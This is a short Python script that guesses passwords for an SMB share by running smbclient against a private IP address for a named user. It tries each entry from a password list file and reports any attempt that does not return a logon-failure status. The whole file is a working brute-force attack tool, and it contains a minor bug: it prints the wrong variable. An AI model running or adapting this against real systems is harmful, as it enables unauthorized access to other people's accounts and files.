from subprocess import Popen, PIPE


def attempt_logon(guess):
    command = 'smbclient //172.16.0.30/homes {} -I 172.16.0.30 -U sigurdkb -c exit'.format(guess)

    #command = 'sudo mount.cifs //172.16.0.30/homes /mnt/homes -o user = sigurdkb'

    output, err = Popen(command.split(), stdout=PIPE, stderr=PIPE).communicate()

    if not b"NT_STATUS_LOGON_FAILURE" in output:
        print()
        print("Password found? ", password)
        print("Output: ", output)
        print("\n\n")
        return True
    return False


pwlist = open("pwlist.txt")

for password in pwlist:
    listFromFile = password.split(":")
    for guess in listFromFile:
        attempt_logon(guess)
pwlist.close()

